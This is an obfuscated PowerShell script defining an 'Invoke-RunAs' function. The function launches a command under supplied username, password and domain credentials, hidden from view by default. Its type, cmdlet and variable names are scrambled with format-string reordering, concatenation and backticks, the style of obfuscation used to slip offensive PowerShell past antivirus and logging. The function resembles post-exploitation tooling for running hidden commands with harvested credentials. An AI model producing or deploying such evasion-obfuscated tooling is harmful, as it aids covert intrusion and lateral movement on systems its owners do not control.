  $Hjx3a  =  [tYPE]("{6}{0}{1}{4}{5}{3}{2}" -f 'Y','stE','cesS','ICs.PrO','M.DiA','gnOsT','S')  ;  function INvO`KE`-ruNas {

    [CmdletBinding()]Param (
    [Parameter(
        VaLUEFRompIpeline=${Tr`Ue})]
        [String]${uSE`RNA`me},
    [Parameter(
        vaLUEFRoMPiPELINe=${t`RUe})]
        [String]${P`ASSW`ord},
    [Parameter(
        valuefRomPipElinE=${t`Rue})]
        [String]${DoMa`In},
    [Parameter(
        vAluEFroMPIpelINE=${t`RUe})]
        [String]${c`md},
    [Parameter()]
        [String]${arG`UMeN`Ts},
    [Parameter()]
        [Switch]${SHowWI`ND`oW}
    )
    PROCESS {
        try{
            ${S`T`ARtINFo} = &("{0}{2}{1}" -f'new-','ject','ob') ("{7}{5}{3}{0}{4}{9}{1}{6}{2}{8}" -f'tics','r','I','os','.','tem.Diagn','ocessStart','Sys','nfo','P')

            ${STar`TI`NfO}."FI`L`enAmE" = ${c`mD}
            ${st`Ar`TiN`Fo}."uSesheL`L`EXE`C`Ute" = ${fA`l`Se}

            if(-not (${s`hOw`wiNdoW})) {
                ${S`Tart`iN`Fo}."cR`EaT`enoWiNdow" = ${t`RUe}
                ${StaR`TI`NFO}."wI`NDoW`s`TYLE" = ("{0}{1}{2}"-f 'H','idd','en')
            }

            if(${A`R`gu`MenTs}) {
                ${S`Ta`RtInFo}."a`RGUMe`NtS" = ${ARG`U`meNTS}
            }

            if(${USe`RN`AME}) {
                
                ${S`TarTiN`FO}."us`eRN`AmE" = ${uSE`RN`Ame}
                ${SE`c_pAS`sWoRD} = &("{2}{4}{3}{0}{1}" -f 'estrin','g','c','vertto-secur','on') ${PASs`WO`RD} -asplaintext -force
                ${S`TARTIn`Fo}."PaS`SWO`RD" = ${SEc`_PaSs`Wo`Rd}
                ${StaR`TI`N`Fo}."DO`main" = ${d`OM`AIN}
            }
            
             (  GeT-varIaBLe ('H'+'jX3A') -va  )::("{1}{0}" -f 'rt','Sta').Invoke(${S`Ta`RTInFO}) | &("{1}{2}{0}" -f'g','out-','strin')
        }
        catch {
            ('[!'+'] '+'Error'+' '+'i'+'n '+'runa'+'s: '+"$_")
        }

    }
}